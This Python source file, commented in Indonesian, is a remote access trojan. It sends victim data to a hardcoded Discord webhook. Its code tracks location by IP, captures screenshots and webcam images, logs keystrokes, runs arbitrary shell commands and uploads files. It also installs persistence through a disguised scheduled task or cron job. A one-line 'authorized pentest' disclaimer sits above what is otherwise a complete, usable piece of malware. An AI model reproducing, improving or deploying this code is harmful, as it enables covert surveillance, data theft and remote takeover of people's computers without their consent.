"""
RAT DISCORD WEBHOOK v1.0
TANPA BOT - Langsung kirim ke Webhook
GPS Tracking + Screenshot + Shell + Persistence
Gunakan untuk Authorized Pentest ONLY
"""

import requests
import psutil
import platform
import os
import pyautogui
from PIL import ImageGrab
import io
import subprocess
import time
import cv2
from pynput import keyboard
import threading
import base64
import json

# ═══════════════════════════════════════════════════════════════
# KONFIGURASI - GANTI INI!
# ═══════════════════════════════════════════════════════════════
WEBHOOK_URL = "https://discord.com/api/webhooks/1413324736213159966/-Z-Ac9Pk-YUlBWD98eLZCUUxgBD3EflFYFgn537L98R68GTI3JYrtC_XC2EqmZ42Ma47"
POLL_INTERVAL = 30  # Check command setiap 30 detik

webhook = WEBHOOK_URL
commands = []
last_commands = []

def send_webhook(title, content="", file=None):
    """Kirim ke Discord Webhook"""
    try:
        data = {"embeds": [{"title": title, "description": content, "color": 0xff4444}]}
        files = {}
        if file:
            files = {"file": ("capture.png", file, "image/png")}
        requests.post(webhook, json=data, files=files if file else None, timeout=10)
    except:
        pass

def get_sysinfo():
    """GPS Tracking + System Info"""
    try:
        # IP + GPS
        ip = requests.get('https://api.ipify.org?format=json', timeout=5).json()['ip']
        geo = requests.get(f'http://ipinfo.io/{ip}/json', timeout=5).json()
        
        loc = geo.get('loc', '0.0,0.0').split(',')
        lat, lon = float(loc[0]), float(loc[1]) if len(loc) > 1 else 0.0
        
        info = f"""**📍 GPS TRACKING**
IP: `{ip}`
City: {geo.get('city')} - {geo.get('country')}
ISP: {geo.get('org')}
**LAT:** `{lat:.6f}` **LON:** `{lon:.6f}`
🗺️ https://maps.google.com/?q={lat:.6f},{lon:.6f}

**💻 SYSTEM**
Host: `{platform.node()}`
OS: `{platform.system()} {platform.release()}`
RAM: `{psutil.virtual_memory().percent:.1f}%`"""
        return info
    except:
        return "❌ GPS failed"

def take_screenshot():
    """Screenshot ke bytes"""
    try:
        img = pyautogui.screenshot()
        buffer = io.BytesIO()
        img.save(buffer, 'PNG')
        buffer.seek(0)
        return buffer
    except:
        return None

def exec_shell(cmd):
    """Execute shell command"""
    try:
        if platform.system() == "Windows":
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
        return f"**OUT:**\n```{result.stdout}```\n**ERR:**\n```{result.stderr}```"
    except:
        return "❌ Command failed"

def webcam_snap():
    """Webcam photo"""
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite('webcam.jpg', frame)
            with open('webcam.jpg', 'rb') as f:
                send_webhook("📸 WEBCAM", file=f)
        cap.release()
        if os.path.exists('webcam.jpg'): os.remove('webcam.jpg')
    except:
        send_webhook("❌ No webcam")

def keylogger(duration=30):
    """Simple keylogger"""
    keys = []
    def on_key(key):
        try: keys.append(str(key.char))
        except: keys.append(f"[{key}]")
    
    listener = keyboard.Listener(on_press=on_key)
    listener.start()
    time.sleep(duration)
    listener.stop()
    return ''.join(keys[-100:])

def add_persistence():
    """Persistence"""
    try:
        if platform.system() == "Windows":
            os.system('schtasks /create /sc onlogon /tn "SysUpdate" /tr "python rat.py" /f')
            send_webhook("✅ Persistence: Windows Scheduled Task")
        else:
            cron = f'@reboot cd {os.getcwd()} && python3 rat.py'
            os.system(f'(crontab -l; echo "{cron}") | crontab -')
            send_webhook("✅ Persistence: Linux Cron")
    except:
        send_webhook("❌ Persistence failed")

def poll_commands():
    """Cek command dari webhook messages (simulasi C2)"""
    global commands, last_commands
    
    # Simulasi: cek file commands.txt atau logic lain
    # Untuk real C2, bisa polling Discord messages via API
    try:
        if os.path.exists('commands.txt'):
            with open('commands.txt', 'r') as f:
                commands = [line.strip() for line in f.readlines() if line.strip()]
            os.remove('commands.txt')
    except:
        pass

def main_loop():
    """Main RAT loop"""
    send_webhook("🚀 RAT ONLINE", get_sysinfo())
    
    while True:
        try:
            poll_commands()
            
            for cmd in commands:
                if cmd not in last_commands:
                    last_commands.append(cmd)
                    
                    if cmd.startswith("screenshot"):
                        img = take_screenshot()
                        send_webhook("📸 SCREENSHOT", file=img)
                        
                    elif cmd.startswith("webcam"):
                        webcam_snap()
                        
                    elif cmd.startswith("shell:"):
                        result = exec_shell(cmd[6:])
                        send_webhook("💻 SHELL", result)
                        
                    elif cmd.startswith("keylog:"):
                        duration = int(cmd[7:])
                        keys = keylogger(duration)
                        send_webhook("⌨️ KEYLOGGER", f"```{keys}```")
                        
                    elif cmd == "persist":
                        add_persistence()
                        
                    elif cmd.startswith("upload:"):
                        filename = cmd[7:]
                        if os.path.exists(filename):
                            with open(filename, 'rb') as f:
                                send_webhook("📤 UPLOAD", file=f)
            
            # Auto screenshot setiap 5 menit
            if int(time.time()) % 300 == 0:
                img = take_screenshot()
                send_webhook("📸 AUTO SCREEN", file=img)
                
            time.sleep(POLL_INTERVAL)
            
        except KeyboardInterrupt:
            send_webhook("🔴 RAT OFFLINE")
            break
        except:
            time.sleep(10)

if __name__ == "__main__":
    print("🚀 RAT Webhook starting...")
    print(f"📍 Target: {platform.node()}")
    main_loop()